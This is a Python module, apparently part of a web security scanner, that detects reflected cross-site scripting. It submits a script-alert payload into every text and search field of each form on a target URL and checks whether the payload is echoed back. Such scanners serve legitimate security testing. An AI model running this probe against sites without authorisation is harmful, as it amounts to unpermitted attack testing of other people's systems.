import requests
from urllib.parse import urljoin
from attacks.form_functions import get_form_details, get_forms
import logging
from attacks.logger import set_logger


set_logger()
log = logging.getLogger(__name__)


def submit_form(form_details, url, value):
	"""
	Submits a form given in `form_details`
	Returns the HTTP Response after form submission
	"""

	target_url = urljoin(url, form_details["action"])
	inputs = form_details["inputs"]
	data = {}

	for input in inputs:
		if input["type"] == "text" or input["type"] == "search":
			input["value"] = value
		
		input_name = input.get("name")
		input_value = input.get("value")
		
		if input_name and input_value:
			data[input_name] = input_value

	log.info(f"[!] Submitting malicious payload to {target_url}")
	log.info(f"[+] Data: {data}")
	print(f"[!] Submitting malicious payload to {target_url}")
	print(f"[+] Data: {data}")

	if form_details["method"] == "post":
		return requests.post(target_url, data=data)
	
	else:
		return requests.get(target_url, params=data)


def xss(url):
	"""
	Given a `url`, it prints all XSS vulnerable forms and 
	returns True if any is vulnerable, False otherwise
	"""

	found = False

	log.info(f'[!] Trying XSS on {url}')

	result = None
	forms = get_forms(url)
	log.info(f"[+] Detected {len(forms)} forms on {url}")
	print(f"[+] Detected {len(forms)} forms on {url}")
	
	js_script = "<script>alert('alert')</script>"
	
	for form in forms:
		form_details = get_form_details(form)
		content = submit_form(form_details, url, js_script).content.decode()

		if js_script in content:
			found = True
			

			result = f"[+] XSS Detected on {url}"
			result += f"\n[*] Form details : "
			result += '\n' + str(form_details)
	
	if found:
		log.info(f"[+] XSS Detected on {url}")
	
	else:
		log.info(f"[-] No XSS Vulnerability detected in {url}")
		result = f'[-] No XSS Vulnerability detected in {url}'

	return result